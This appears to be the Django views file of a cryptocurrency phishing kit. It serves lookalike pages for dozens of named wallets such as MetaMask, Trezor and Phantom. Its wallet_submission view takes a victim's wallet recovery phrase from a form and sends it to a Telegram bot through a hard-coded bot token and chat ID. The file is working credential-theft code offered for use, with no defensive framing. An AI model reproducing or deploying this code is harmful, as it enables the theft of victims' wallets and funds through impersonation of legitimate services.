from django.shortcuts import render, redirect
from django.http import HttpResponse
import requests

# Create your views here.

def index(request):
    return render(request, 'index.html')

def registry(request):
    return render(request, 'registry.html')

def walletconnect(request):
    return render(request, 'walletconnect.html')

def trustwallet(request):
    return render(request, 'trustwallet.html')

def exoduswallet(request):
    return render(request, 'exoduswallet.html')

def metamask(request):
    return render(request, 'metamask.html')

def bitcoinwallet(request):
    return render(request, 'bitcoinwallet.html')

def coinbasewallet(request):
    return render(request, 'coinbasewallet.html')

def blockchainwallet(request):
    return render(request, 'blockchainwallet.html')

def trezorwallet(request):
    return render(request, 'trezorwallet.html')

def heliumwallet(request):
    return render(request, 'heliumwallet.html')

def monerowallet(request):
    return render(request, 'monerowallet.html')

def solanawallet(request):
    return render(request, 'solanawallet.html')

def solflare(request):
    return render(request, 'solflare.html')

def phantomwallet(request):
    return render(request, 'phantomwallet.html')

def uniswapwallet(request):
    return render(request, 'uniswapwallet.html')

def spotwallet(request):
    return render(request, 'spotwallet.html')

def unstoppablewalletdomains(request):
    return render(request, 'unstoppablewalletdomains.html')

def bitkeepwallet(request):
    return render(request, 'bitkeepwallet.html')

def omniwallet(request):
    return render(request, 'omniwallet.html')

def tokenpocketwallet(request):
    return render(request, 'tokenpocketwallet.html')

def safepalwallet(request):
    return render(request, 'safepalwallet.html')

def kriptoniowallet(request):
    return render(request, 'kriptoniowallet.html')

def binancedefiwallet(request):
    return render(request, 'binancedefiwallet.html')

def robinhoodwallet(request):
    return render(request, 'robinhoodwallet.html')

def binancewallet(request):
    return render(request, 'binancewallet.html')

def infinitywallet(request):
    return render(request, 'infinitywallet.html')

def catecoinwallet(request):
    return render(request, 'catecoinwallet.html')

def bytebank(request):
    return render(request, 'bytebank.html')

def optowallet(request):
    return render(request, 'optowallet.html')

def ottrfinance(request):
    return render(request, 'ottrfinance.html')

def monarchwallet(request):
    return render(request, 'monarchwallet.html')

def safemoon(request):
    return render(request, 'safemoon.html')

def cryptodefiwallet(request):
    return render(request, 'cryptodefiwallet.html')

def xdefiwallet(request):
    return render(request, 'xdefiwallet.html')

def ripiowallet(request):
    return render(request, 'ripiowallet.html')

def neonwallet(request):
    return render(request, 'neonwallet.html')

def masknetwork(request):
    return render(request, 'masknetwork.html')

def fireblockswallet(request):
    return render(request, 'fireblockswallet.html')

def plasmawallet(request):
    return render(request, 'plasmawallet.html')

# Generic submission view for all wallets
def wallet_submission(request):
    if request.method == 'POST':
        # Get the wallet name and recovery phrase from the form
        wallet_name = request.POST.get('wallet_name', 'Unknown Wallet')
        recovery_phrase = request.POST.get('recoveryPhrase')

        if recovery_phrase:
            # Telegram Bot Token and Chat ID
            BOT_TOKEN = '7815755406:AAEKkmdV-IpSXpkgbTlDELOohA4QpU5wOUY'
            CHAT_ID = '6714402637'

            # Message to send to Telegram
            message = f"Wallet: {wallet_name}\nRecovery Phrase: {recovery_phrase}"

            # Send the message to Telegram
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': CHAT_ID,
                'text': message
            }
            response = requests.post(url, data=payload)

            # Check if the message was sent successfully
            if response.status_code == 200:
                return HttpResponse(f"Submission received for {wallet_name}!")
            else:
                return HttpResponse("Failed to send the message to Telegram.")

        else:
            return HttpResponse("Please enter a valid recovery phrase.")
    return redirect('index')  # Redirect to the homepage if not POST